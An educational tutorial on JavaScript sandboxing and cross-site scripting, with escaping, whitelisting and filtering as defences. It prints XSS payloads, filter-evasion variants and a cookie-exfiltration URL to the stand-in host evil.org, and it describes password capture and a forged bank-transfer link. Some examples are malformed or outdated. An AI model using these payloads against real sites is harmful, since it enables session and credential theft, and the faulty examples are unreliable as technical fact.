Javascript Security
===

Javascript is a programming language with the power of any other programming
language that can be used to write complex applications.  The interpreter for
this language is built in to your web browser running on your local computer
and Javascript programs are downloaded from the web when they are linked
to web pages and executed.   Taken at face value, this seems like a recipe for 
disaster from a security perspective.  We download random code from the net
and run it on our local machine.  These days we know we should not do this
because there will always be a malicious actor ready to exploit this to deliver
code that will compromise your system in some way.  So, why is it ok to
download Javascript code and run it? What does the Javascript environment 
do to prevent bad things happening?  

There have been two main models for running downloaded code in the web environment: 
one based on trust certification and one based on restricted execution environments. 
In the trust model (used by Microsoft ActiveX), any code that was to be executed had 
to be digitally signed
by the originating site, identifying it as definitely coming from that provider. If you
trusted Microsoft then you would accept any code signed by them to run in your browser. 
The problem with this is that it was too easy to set yourself up as a provider and
most people would blindly trust everything if it offered them something interesting. 

The alternative is to make it so that the code that was downloaded could not do bad
things by restricting the environment that it is run in. This is the approach taken
by Javascript.

## Restricted Execution Environment

When you run Javascript in your browser it operates in a _sandbox_ environment. The 
running code only has access to a limited set of resources on your machine. For example, 
it is not allowed to write to the file system and it has only limited access to your display. 
The general principle is that the Javascript code should have as little access to 
resources as possible and that all access is considered as a possible attack vector and
carefully controlled.  

### File System Access

Unlike most programming languages, Javascript has no native file handling primitives. You
can't open a file for reading or writing in Javascript.  The only access you have
to the file system is via the [FileList](https://developer.mozilla.org/en-US/docs/Web/API/FileList)
interface that represents files that the user has chosen through an interactive 
dialogue - that is, the user must be involved in giving explicit access to files 
for _reading_ only.   In the [node.js](https://nodejs.org) interpreter that is intended to run scripts 
on your laptop or on a server, there is a 
[special filesystem module](https://nodejs.org/docs/latest/api/fs.html) that needs
to be loaded to provide access to files. So, Javascript prevents malicious attacks on
the file system by preventing any kind of access at a very low level in the language. 

### Networking

Javascript can make network requests in a number of ways.  This could be explicit 
via an `XMLHttpRequest` or indirectly by inserting a fragment of HTML including
a `<script src='...'></script>` or `<img src='...'>` tag referencing a remote resource. 
This means that network access is limited to using a protocol like HTTP or FTP rather than 
allowing arbitrary protocols (eg. SMTP for mail or SNMP for network management).   

Any request made by Javascript is subject to a Same Origin Policy which 
restricts the requests that can be made to servers other than the one
that was the origin of the page. In general, it is ok for the script to _send_ 
data to a different domain but reading data is restricted. 

Another mechanism is the newer 
[Web Socket API](https://developer.mozilla.org/en-US/docs/Web/API/Websockets_API) which
uses the WSS protocol to open a bidirectional connection between client
and server.  WSS communication is not subject to Cross Origin restrictions but again must
use the high level WSS protocol for all requests.


### Access to the Browser

Javascript code running in the browser has access to the current page via the `document`
global variable and to the browser window via `window`.  Importantly, these refer
only to the contents of one browser tab or window. There is no way for a script to
reference any content from any other tab or even to know that another tab exists. 

This prevents a possible attack where a malicious script in one page reads sensitive 
data from another page in another tab.  

Javascript can also access cookies that have been set for the current site. The `document.cookie`
property contains all of the cookies that have been sent by the current site. Javascript
can even update this list to add a new cookie that will be sent back with any future requests. 
Importantly though, a script has no access at all to cookies from any domain other than the 
origin domain for the page it is running in.  This means that a script can't grab the cookie
associated with my banking site and use it to make requests on my behalf. 

In general, a script is limited to accessing information about the page it is running on
and the domain that this page was requested from.  

## Cross Site Scripting

Given the restrictions on what a script is allowed to access, to mount an attack on
a site via Javascript the attacker needs to arrange for their code to be loaded into
the target page and executed.   If that is possible, then they will have access to 
all of the context of that page and further attacks can be carried out.  

One way to insert content into a page you have not written is to exploit a weakness
in a site that allows users to post content that will be displayed to other users. 
Any social media site would be a good candidate for this kind of attack as they allow
users to post messages that are then shown to other users.   Imagine a social media 
site that allows me to post a message. This message is stored in the database and when
another user requests a list of the latest messages, my message will be shown on 
their page.   If I include some HTML markup in my message and the site is not checking
for this, the markup might be inserted directly into the page delivered to other users.

For example, say I write the following message:

```html
<p>Happy to visit my family today! Had a <span onload="alert('hello')"</span>great</span> day</p>
```
The simple social media site just inserts my message into the page delivered
to the next user:
```html
<div class="message">
    <div class="author">Steve</div>
    <p>Nailed it! LOL</p>
</div>
<div class="message">
    <div class="author">Jane</div>
    <p><p>Happy to visit my family today! Had a <span onload="alert('hello')"</span>great</span> day</p></p>
</div>
<div class="message">
    <div class="author">Jai</div>
    <p>Thanks for everything!</p>
</div>
```
Now, when another user loads this page, the Javascript attached to the `span` element will 
be executed (in response to the `onload` event) and the user will see an alert box.  Of course, 
I could have included any kind of Javascript in this attribute; the point is that I have arranged
for my Javascript code to be run in the context of another user's web browser.

This is an example of a _Cross Site Scripting_ (XSS) attack, one of the most common kinds of security
vulnerability on the web.  


### Reflected XSS

Another possible route for an XSS attack is with a site that makes use of some part of
the requesting URL in generating the page that is returned for the response. For example, 
I might have a site that shows various product categories with URLs like 
`http://example.org/products/womens`, `http://example.org/products/mens` or `http://example.org/products/children`. 
In each case I have content in the page like `<h3>Products in category <i>womens</i></h3>`
where the product category comes from the URL.  I could attack this site by constructing
a URL like `http://example.org/products/<span onmouseover='alert('XSS')>mens</span>`. This
might force the site to include this markup in the resulting page and my Javascript
would be executed.   Now I just need to arrange for my victim to click on this link
and I have an attack; this can be done by sending this link in an email or using it in
a forum post.  A naive user sees the domain name of a site they now and doesn't understand
all of the other stuff in the URL and so might be fooled by this. 

Data taken from the URL is just as dangerous as data taken from form submissions when it 
comes to trusting input to your site.  We often use very general patterns for our 
URL routes and often don't check that the values we get from them are reasonable.  We assume
that we are the only ones constructing URLs pointing to our site, but attackers can and
will exploit this if they can.

### Protecting against XSS

XSS relies on a web application reproducing the text of my message in the page that is sent
to other users.  The main defence against XSS then is to not do this and assume that any
text that is entered by users is a potential attack vector. 

The strongest defence against XSS is to replace any special HTML characters in the message
with entity references so that they will not be interpreted as HTML by the browser. In this case
my sample message would be converted to:

```html
'&lt;p&gt;Happy to visit my family today! Had a &lt;span onload=&quot;alert(&#x27;hello&#x27;)&quot;&lt;/span&gt;great&lt;/span&gt; day&lt;/p&gt;\n'
```
When this is inserted into the page, the user will see HTML text in my message because the
browser will display `&lt;` as `<` etc.  This is known as _escaping_ the HTML content for inclusion
in the page.

This method is so commonly useful that most HTML templating systems will by default
carry out this conversion on any data that is inserted into the HTML page. For example in
bottle I might have a template for my list of messages:

```html
% for message in messages:
<div class="message">
    <div class="author">{{message.author}}</div>
    <p>{{message.text}}</p>
</div>
% end
```  
This will have the effect of escaping the content of the author and text fields before 
inserting them into the page and will therefore prevent XSS attacks. I actually need to
take a further step to prevent bottle from escaping the content by adding an exclamation
mark at the start of the double curly braces: `{{!message.text}}`.

However, it may be that I want to allow my users to add HTML markup to their messages. After
all it's nice to be able to format them nicely, add emphasis, bullet points etc. In that case, 
I might want to accept messages in HTMl and insert them directly into the page. To avoid the
possibility of XSS attacks, I need to make sure that the HTML that I am inserting does
not contain a payload of Javascript code. There are a few approaches to doing this.

**Markdown** I could disallow HTML markup but allow something like 
[Markdown](https://daringfireball.net/projects/markdown/syntax) which
is a kind of markup that can be converted to HTML.  This allows users to format their
content but prevents them writing any kind of HTML that might have an exploit. 

**Whitelisting** I can define a subset of HTML tags that I will allow in messages and
then scan the message to remove anything other than these.  So I might allow `<p>`, 
`<strong>`, `<ul>` and `<li>` tags and remove anything else including any attributes
on any of these tags.  If I do this then it will be reasonably safe to insert the HTML
content into the page.

**Filtering** I can try to remove any scripts from the HTML that is entered in the message. 
There are only so many places that scripts can go so I can just look in those places and
remove anything that looks suspicious.  The danger here is that the attacker is
cleverer than you - or at least has more time to think up devilish ways to defeat your
filters. For example, what if you thought images were ok:

```html
<IMG SRC="javascript:alert('XSS');">
```
ah, maybe we look for javascript:

```html
<IMG SRC=JaVaScRiPt:alert('XSS')>
```
ok, I can make it case sensitive:

```html
<IMG SRC="jav	ascript:alert('XSS');">
```
(this has an embedded tab but still works).  Ok I can get rid of whitespace before I scan.

```html
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
```

(the code is written as escaped characters).  Give in yet? (For more ways that can be used 
to defeat filters see the 
[OWASP XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)).

So while it is possible to filter HTML to sanitise user input it is very difficult to 
pick up all of the many ways that Javascript code can be included in a page.  All it takes
is one way in and the attacker has full control of the page on another user's system.

### Attacks with XSS

Once I am able to mount an XSS attack and load some Javascript into the page, what can I 
do that is truly evil?  

**Capture cookies** Javascript has access to cookies for the page it is running in, if that 
is something like Facebook or Ebay there is potential value in being able to 
impersonate a user and so having their cookies would allow me to do that.  I can use
Javascript to construct a URL like `'http://evil.org/cookiecapture?cookies='+document.cookie` and
then set `document.location` to this URL, the browser will immediately request
this URL and I would be able to capture their cookies _for the site I had infected_.  

**Password Capture** since Javascript can modify the entire page, I could replace
the current page with HTML designed to look like the login page for the site but
with the login form directed to `http://evil.org/passwordcapture`.  The user thinks
they have just been logged out, enters their login details (the URL still says they
are on the social media site) and they are sent to my site. My site redirects back 
to the original page and the user doesn't know they've lost their details.  I can then 
login as them at leisure. 

**Make purchases** if this is a commerce site and I've infected the reviews section
of the site, then the user might be authenticated on the site and if I'm lucky have
a credit card registered for purchases.  My Javascript code could make a request to purchase
something from the site by submitting the right combination of forms.  It might be
possible to have them delivered to my address or I might just want to annoy the 
user by racking up large purchases on their credit card. 

**Requests to other sites** while there are restrictions on what requests Javascript
can make, I might be able to arrange to send malicious requests to other sites by
adding elements to the page.  I could for example add a link to the page
with a URL like `https://yourbank.com/transfer_funds?to_account=9283208&amount=10000` and
hope that the user clicks on this link.  If they are logged in to their bank at the time
then this request would be sent with their current session cookie and if I'm lucky
the money will be transferred to me.  (This is a simplistic example but many sites support
some kind of transactional requests via URLs like this and could be exploited in this way).

### XSS Auditing

Modern browsers will make some attempt to stop you being attacked via an XSS vector.  In 
particular there is a component called the [XSS Auditor](https://www.virtuesecurity.com/blog/understanding-xss-auditor/) that checks for some obvious
reflection attacks.  If you make a request with special characters in a URL like 
this one described earlier:

```html
http://example.org/products/<span onmouseover='alert('XSS')>mens</span>
```

and the resulting page contains the same tags as in the URL, the XSS Auditor will block
the display of the page in case this is an attack vector.  This can block a number 
of the more obvious attacks. 